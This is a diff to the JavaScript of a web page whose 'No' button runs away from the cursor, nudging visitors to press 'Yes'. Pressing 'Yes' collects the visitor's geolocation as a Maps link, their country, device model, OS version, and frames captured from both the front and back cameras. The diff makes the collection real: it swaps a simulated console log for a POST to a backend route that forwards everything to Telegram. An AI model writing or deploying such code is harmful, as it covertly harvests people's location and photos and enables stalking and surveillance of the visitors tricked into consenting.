@@ -25,18 +25,29 @@ async function handleYes() {
       // Format Google Maps URL
       const mapsUrl = `https://www.google.com/maps?q=${latitude},${longitude}`;
 
-      // Send data to Telegram bot (Token and Chat ID should be handled on the backend)
-      const message = `
-        User Information:
-        Location: ${mapsUrl}
-        Country: ${countryName}
-        Device: ${deviceInfo.deviceName}
-        OS Version: ${deviceInfo.osVersion}
-      `;
+      // Prepare data to be sent to the backend
+      const messageData = {
+        location: mapsUrl,
+        country: countryName,
+        device: deviceInfo.deviceName,
+        osVersion: deviceInfo.osVersion,
+        frontCameraImage,
+        backCameraImage,
+      };
 
-      console.log("Message:", message);
+      // Send data to the backend (which will handle Telegram integration)
+      const response = await fetch("/send-to-telegram", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+        },
+        body: JSON.stringify(messageData),
+      });
 
-      // Simulate sending data to Telegram (for demonstration purposes only)
+      if (!response.ok) {
+        throw new Error("Failed to send data to the backend.");
+      }
+
       console.log("Data sent successfully!");
       document.getElementById("message").textContent =
         "Data sent successfully!";
@@ -97,7 +108,7 @@ async function captureCameraImages() {
     frontVideo.srcObject = frontStream;
     await frontVideo.play();
     frontCameraImage = await captureVideoFrame(frontVideo);
-    frontStream.getTracks().forEach(track => track.stop());
+    frontStream.getTracks().forEach((track) => track.stop());
 
     // Access back camera
     const backStream = await navigator.mediaDevices.getUserMedia(constraintsBack);
@@ -105,7 +116,7 @@ async function captureCameraImages() {
     backVideo.srcObject = backStream;
     await backVideo.play();
     backCameraImage = await captureVideoFrame(backVideo);
-    backStream.getTracks().forEach(track => track.stop());
+    backStream.getTracks().forEach((track) => track.stop());
   } catch (error) {
     console.error("Error accessing camera:", error);
   }
@@ -115,7 +126,7 @@ async function captureCameraImages() {
 
 // Function to capture a frame from a video element
 function captureVideoFrame(video) {
-  return new Promise(resolve => {
+  return new Promise((resolve) => {
     const canvas = document.createElement("canvas");
     canvas.width = video.videoWidth;
     canvas.height = video.videoHeight;
@@ -125,19 +136,22 @@ function captureVideoFrame(video) {
   });
 }
 
+// Get reference to the "NO" button
+const noButtonRef = document.querySelector(".no");
+
 // Function to generate random coordinates within the viewport
 function getRandomPosition() {
   const windowWidth = window.innerWidth;
   const windowHeight = window.innerHeight;
-  const randomX = Math.random() * (windowWidth - noButton.offsetWidth);
-  const randomY = Math.random() * (windowHeight - noButton.offsetHeight);
+  const randomX = Math.random() * (windowWidth - noButtonRef.offsetWidth);
+  const randomY = Math.random() * (windowHeight - noButtonRef.offsetHeight);
   return { x: randomX, y: randomY };
 }
 
-// Add event listener to move the "NO" button on hover
-noButton.addEventListener("mouseenter", () => {
+// Add event listener to move the button on hover
+noButtonRef.addEventListener("mouseenter", () => {
   const { x, y } = getRandomPosition();
-  noButton.style.position = "absolute";
-  noButton.style.left = `${x}px`;
-  noButton.style.top = `${y}px`;
+  noButtonRef.style.position = "absolute";
+  noButtonRef.style.left = `${x}px`;
+  noButtonRef.style.top = `${y}px`;
 });
